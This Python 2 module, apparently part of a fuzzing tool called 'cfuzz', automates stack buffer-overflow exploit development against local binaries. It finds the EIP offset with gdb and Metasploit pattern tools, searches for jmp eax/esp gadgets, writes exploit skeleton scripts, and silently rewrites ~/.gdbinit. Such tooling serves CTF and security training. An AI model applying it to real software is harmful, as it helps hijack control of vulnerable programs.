# -*- coding: UTF-8 -*-
import os, textcolors, commands
from os.path import expanduser
from subprocess import Popen, PIPE, STDOUT

def eipcheck():
     with open('./gdb.txt','r') as myfile:
          for line in myfile:
               if '0x' in line:
                    global eip
                    eip = '%s ' % line.split()[0].split('x')[1]

def exdev( args,filename,buffer,fpath,eipch ):
     textcolors.colortext( "Looking for jmp/call eax.", textcolors.HEADER, 'print')
     eax = commands.getoutput( "msfelfscan -j eax %s" % fpath )
     textcolors.colortext( "Looking for jmp/call esp.", textcolors.HEADER, 'print')
     esp = commands.getoutput( "msfelfscan -j esp %s" % fpath )
     if eipch is not False:
          textcolors.colortext( "Starting exploit skeleton creation by creating pattern.", textcolors.HEADER, 'print')

          textcolors.colortext( "Ensuring we get 41414141 in EIP.", textcolors.HEADER, 'print')
          with open('./tmp.py', 'w+') as myfile:
               myfile.write("buffer = 'A' * %s \n" % buffer)
               myfile.write("gdb.execute(\"set pagination off\")\n")
               myfile.write("gdb.execute(\"set confirm off\")\n")
               myfile.write("gdb.execute(\"set logging overwrite on\")\n")
               myfile.write("gdb.execute(\"set logging redirect on\")\n")
               myfile.write("gdb.execute(\"set logging on\")\n")
               myfile.write("gdb.execute(\"file %s\")\n" % fpath)
               myfile.write("gdb.execute(\"run %s\" % buffer)\n")
               myfile.write("gdb.execute(\"quit\")")

          peda = commands.getoutput( "cat ~/.gdbinit" )
          if "source ~/peda/peda.py" in peda:
              os.system("sed -i -e 's/source ~\/peda\/peda.py/#source ~\/peda\/peda.py/g' ~/.gdbinit")

          os.system('gdb -q -x ./tmp.py')

          eipcheck()

          try:
               if eip == '41414141 ':
                    textcolors.colortext( 'Seems like we overwrite eip as %s, continuing!' % eip, textcolors.GREEN, 'print' )
               else:
                    textcolors.colortext( 'Doesn\'t seem like we got EIP control!', textcolors.FAIL, 'print' )
                    exit(0)
          except NameError:
               textcolors.error( "Something went wrong, can't get EIP for this binary through input." , 3, 'print' )
               exit(0)

          pattern = os.popen('/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l %s' % buffer).read()
          patternf = pattern.split('\n')[0]
          textcolors.colortext( "Overflowing in GDB with msf pattern.", textcolors.HEADER, 'print')
          with open('./tmp.py', 'w+') as myfile:
               myfile.write("buffer = '%s' \n" % patternf)
               myfile.write("gdb.execute(\"set pagination off\")\n")
               myfile.write("gdb.execute(\"set confirm off\")\n")
               myfile.write("gdb.execute(\"set logging overwrite on\")\n")
               myfile.write("gdb.execute(\"set logging redirect on\")\n")
               myfile.write("gdb.execute(\"set logging on\")\n")
               myfile.write("gdb.execute(\"file %s\")\n" % fpath)
               myfile.write("gdb.execute(\"run %s\" % buffer)\n")
               myfile.write("gdb.execute(\"quit\")")

          os.system('gdb -q -x ./tmp.py')

          textcolors.colortext( "Finding EIP offset based on overflowed EIP in pattern.", textcolors.HEADER, 'print')
          eipcheck()
          eipamt = os.popen('/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q %s -l %s | cut -d\' \' -f6' % (eip, buffer)).read()
          eipamtf = int(eipamt.split('\n')[0])

          textcolors.colortext( "Writing Exploit with eip offset at %s bytes." % eipamtf, textcolors.HEADER, 'print')
          with open("./%s.py" % filename, 'w') as myfile:
               myfile.write('#!/usr/bin/python\n')
               myfile.write('# -*- coding: UTF-8 -*-\n')
               myfile.write('import os\n')
               myfile.write('from cfuzz import textcolors\n')
               myfile.write('\n')
               myfile.write('\'\'\'EAX%s\'\'\'\n' % eax)
               myfile.write('\'\'\'ESP%s\'\'\'\n' % esp)
               myfile.write('\n')
               myfile.write('buffer = "A" * %s + "B" * 4 + "C" * (%s - %s - 4)' % (eipamtf,buffer,eipamtf))
               myfile.write('\n')
               myfile.write('\n')
               myfile.write("textcolors.colortext( 'Running buffer length %s against {}' % len(buffer), textcolors.HEADER, 'print' )\n".format(fpath)) 
               if args is None:
                    myfile.write("os.system('{} %s' % buffer)\n".format(fpath))
               else:
                    myfile.write("os.system('{} {} %s' % buffer)\n".format(fpath,args))

          textcolors.colortext( "Finished! Cleaning up.", textcolors.HEADER, 'print')
          os.system('rm ./gdb.txt ./tmp.py')
          peda = commands.getoutput( "cat ~/.gdbinit" )
          if "#source ~/peda/peda.py" in peda:
              os.system("sed -i -e 's/#source ~\/peda\/peda.py/source ~\/peda\/peda.py/g' ~/.gdbinit")
          textcolors.colortext( 'Exploit created in working directory as ./%s.py' % filename, textcolors.HEADER, 'print')
     else:
          with open("./%s.py" % filename, 'w') as myfile:
               myfile.write('#!/usr/bin/python\n')
               myfile.write('# -*- coding: UTF-8 -*-\n')
               myfile.write('import os\n')
               myfile.write('from cfuzz import textcolors\n')
               myfile.write('\n')
               myfile.write('\'\'\'EAX%s\'\'\'\n' % eax)
               myfile.write('\'\'\'ESP%s\'\'\'\n' % esp)
               myfile.write('\n')
               myfile.write('buffer = "A" * %s' % (buffer))
               myfile.write('\n')
               myfile.write('\n')
               myfile.write("textcolors.colortext( 'Running buffer length %s against {}' % len(buffer), textcolors.HEADER, 'print' )\n".format(fpath)) 
               if args is None:
                    myfile.write("os.system('{} %s' % buffer)\n".format(fpath))
               else:
                    myfile.write("os.system('{} {} %s' % buffer)\n".format(fpath,args))
          textcolors.colortext( 'Exploit created in working directory as ./%s.py' % filename, textcolors.HEADER, 'print')

def exdev2( args,filename,buffer,fpath,eipch ):
     textcolors.colortext( "Looking for jmp/call eax.", textcolors.HEADER, 'print')
     eax = commands.getoutput( "msfelfscan -j eax %s" % fpath )
     textcolors.colortext( "Looking for jmp/call esp.", textcolors.HEADER, 'print')
     esp = commands.getoutput( "msfelfscan -j esp %s" % fpath )
     if eipch is not False:
          textcolors.colortext( "Starting exploit skeleton creation by creating pattern.", textcolors.HEADER, 'print')

          textcolors.colortext( "Ensuring we get 41414141 in EIP.", textcolors.HEADER, 'print')
          with open('./tmp.py', 'w+') as myfile:
               myfile.write("buffer = 'A' * %s \n" % buffer)
               myfile.write("gdb.execute(\"set pagination off\")\n")
               myfile.write("gdb.execute(\"set confirm off\")\n")
               myfile.write("gdb.execute(\"set logging overwrite on\")\n")
               myfile.write("gdb.execute(\"set logging redirect on\")\n")
               myfile.write("gdb.execute(\"set logging on\")\n")
               myfile.write("gdb.execute(\"file %s\")\n" % fpath)
               if args is None:
                    myfile.write("gdb.execute(\"shell echo '%s' > tmp.txt\")\n" % ("A"*buffer))
               else:
                    myfile.write("gdb.execute(\"shell echo '%s %s' > tmp.txt\")\n" % (args,"A"*buffer))
               myfile.write("gdb.execute(\"run < tmp.txt\")\n")
               myfile.write("gdb.execute(\"quit\")")

          peda = commands.getoutput( "cat ~/.gdbinit" )
          if "source ~/peda/peda.py" in peda:
              os.system("sed -i -e 's/source ~\/peda\/peda.py/#source ~\/peda\/peda.py/g' ~/.gdbinit")

          os.system('gdb -q -x ./tmp.py')

          eipcheck()

          try:
               if eip == '41414141 ':
                    textcolors.colortext( 'Seems like we overwrite eip as %s, continuing!' % eip, textcolors.GREEN, 'print' )
               else:
                    textcolors.colortext( 'Doesn\'t seem like we got EIP control!', textcolors.FAIL, 'print' )
                    os.system('rm ./tmp.py ./tmp.txt')
                    exit(0)
          except NameError:
               textcolors.error( "Something went wrong, can't get EIP for this binary through input." , 3, 'print' )
               exit(0)

          textcolors.colortext( "Overflowing in GDB with MSF pattern.", textcolors.HEADER, 'print')
          pattern = os.popen('/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l %s' % buffer).read()
          patternf = pattern.split('\n')[0]
          with open('./tmp.py', 'w+') as myfile:
               myfile.write("buffer = '%s' \n" % patternf)
               myfile.write("gdb.execute(\"set pagination off\")\n")
               myfile.write("gdb.execute(\"set confirm off\")\n")
               myfile.write("gdb.execute(\"set logging overwrite on\")\n")
               myfile.write("gdb.execute(\"set logging redirect on\")\n")
               myfile.write("gdb.execute(\"set logging on\")\n")
               myfile.write("gdb.execute(\"file %s\")\n" % fpath)
               if args is None:
                    myfile.write("gdb.execute(\"shell echo '%s' > tmp.txt\")\n" % patternf)
               else:
                    myfile.write("gdb.execute(\"shell echo '%s %s' > tmp.txt\")\n" % (args, patternf))
               myfile.write("gdb.execute(\"run < tmp.txt\")\n")
               myfile.write("gdb.execute(\"quit\")")

          os.system('gdb -q -x ./tmp.py')

          textcolors.colortext( "Finding EIP offset based on overflowed EIP in pattern.", textcolors.HEADER, 'print')
          eipcheck()
          eipamt = os.popen('/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q %s -l %s | cut -d\' \' -f6' % (eip, buffer)).read()
          eipamtf = int(eipamt.split('\n')[0])

          with open("./%s.py" % filename, 'w') as myfile:
               myfile.write('#!/usr/bin/python\n')
               myfile.write('# -*- coding: UTF-8 -*-\n')
               myfile.write('import os\n')
               myfile.write('from cfuzz import textcolors\n')
               myfile.write('from subprocess import Popen, PIPE, STDOUT\n')
               myfile.write('\n')
               myfile.write('\'\'\'EAX%s\'\'\'\n' % eax)
               myfile.write('\'\'\'ESP%s\'\'\'\n' % esp)
               myfile.write('\n')
               myfile.write('buffer = "A" * %s + "B" * 4 + "C" * (%s-%s-4)' % (eipamtf,buffer,eipamtf))
               myfile.write('\n')
               myfile.write('\n')
               myfile.write("textcolors.colortext( 'Running buffer length %s against {}' % len(buffer), textcolors.HEADER, 'print' )\n".format(fpath)) 
               myfile.write('p = Popen("%s", stdout=PIPE, stdin=PIPE, stderr=STDOUT, shell=True)\n' % fpath)
               if args is None:
                    myfile.write("grep_stdout = p.communicate(input=buffer)[0]\n")
               else:
                    myfile.write("grep_stdout = p.communicate(input='{} %s' % buffer)[0]\n".format(args))
               myfile.write('print(grep_stdout)\n')

          os.system('rm ./gdb.txt ./tmp.py ./tmp.txt')
          peda = commands.getoutput( "cat ~/.gdbinit" )
          if "#source ~/peda/peda.py" in peda:
              os.system("sed -i -e 's/#source ~\/peda\/peda.py/source ~\/peda\/peda.py/g' ~/.gdbinit")
          textcolors.colortext( 'Exploit created in working directory as ./%s.py' % filename, textcolors.HEADER, 'print')

     else:
          with open("./%s.py" % filename, 'w') as myfile:
               myfile.write('#!/usr/bin/python\n')
               myfile.write('# -*- coding: UTF-8 -*-\n')
               myfile.write('import os\n')
               myfile.write('from cfuzz import textcolors\n')
               myfile.write('from subprocess import Popen, PIPE, STDOUT\n')
               myfile.write('\n')
               myfile.write('\'\'\'EAX%s\'\'\'\n' % eax)
               myfile.write('\'\'\'ESP%s\'\'\'\n' % esp)
               myfile.write('\n')
               myfile.write('buffer = "A" * %s' % (buffer))
               myfile.write('\n')
               myfile.write('\n')
               myfile.write("textcolors.colortext( 'Running buffer length %s against {}' % len(buffer), textcolors.HEADER, 'print' )\n".format(fpath)) 
               myfile.write('p = Popen("%s", stdout=PIPE, stdin=PIPE, stderr=STDOUT, shell=True)\n' % fpath)
               if args is None:
                    myfile.write("grep_stdout = p.communicate(input=buffer)[0]\n")
               else:
                    myfile.write("grep_stdout = p.communicate(input='{} %s' % buffer)[0]\n".format(args))
               myfile.write('print(grep_stdout)\n')

          textcolors.colortext( 'Exploit created in working directory as ./%s.py' % filename, textcolors.HEADER, 'print')

def stringexdev( args,type,fpath,filename ):
     with open("./%s.py" % filename, 'w') as myfile:
          myfile.write('#!/usr/bin/python\n')
          myfile.write('# -*- coding: UTF-8 -*-\n')
          myfile.write('import os\n')
          myfile.write('from cfuzz import textcolors\n')
          myfile.write('from subprocess import Popen, PIPE, STDOUT\n')
          myfile.write('\n')
          myfile.write('textcolors.colortext ( "Enter the buffer %s how many times into %s?> ",textcolors.GREEN )\n' % (type,fpath))
          myfile.write('amt = input(textcolors.colormsg)\n')
          myfile.write('buffer = \'{}.\' * amt + \'{}\''.format(type,type))
          myfile.write('\n')
          myfile.write('p = Popen(\'%s\', stdout=PIPE, stdin=PIPE, stderr=STDOUT, shell=True)\n' % fpath)
          if args is None:
               myfile.write('grep_stdout = p.communicate(input=buffer)[0]\n')
          else:
               myfile.write('grep_stdout = p.communicate(input=\'{} %s\' % buffer)[0]\n'.format(args))
          myfile.write('print(grep_stdout.decode())\n')

     textcolors.colortext( 'Exploit created in working directory as ./%s.py' % filename, textcolors.HEADER, 'print')

def stringexdevB( args,type,fpath,filename ):
     with open("./%s.py" % filename, 'w') as myfile:
          myfile.write('#!/usr/bin/python\n')
          myfile.write('# -*- coding: UTF-8 -*-\n')
          myfile.write('import os\n')
          myfile.write('from cfuzz import textcolors\n')
          myfile.write('from subprocess import Popen, PIPE, STDOUT\n')
          myfile.write('\n')
          myfile.write('textcolors.colortext ( "Enter the buffer %s how many times into %s?> ",textcolors.GREEN )\n' % (type,fpath))
          myfile.write('amt = input(textcolors.colormsg)\n')
          myfile.write('buffer = \'{}.\' * amt + \'{}\''.format(type,type))
          myfile.write('\n')
          if args is None:
               myfile.write('grep_stdout = os.popen(\'{} %s\' % buffer).read().split(\'\\n\')[0]\n'.format(fpath))
          else:
               myfile.write('grep_stdout = os.popen(\'{} {} %s\' % buffer).read().split(\'\\n\')[0]\n'.format(fpath,args))
          myfile.write('print(grep_stdout)\n')

     textcolors.colortext( 'Exploit created in working directory as ./%s.py' % filename, textcolors.HEADER, 'print')
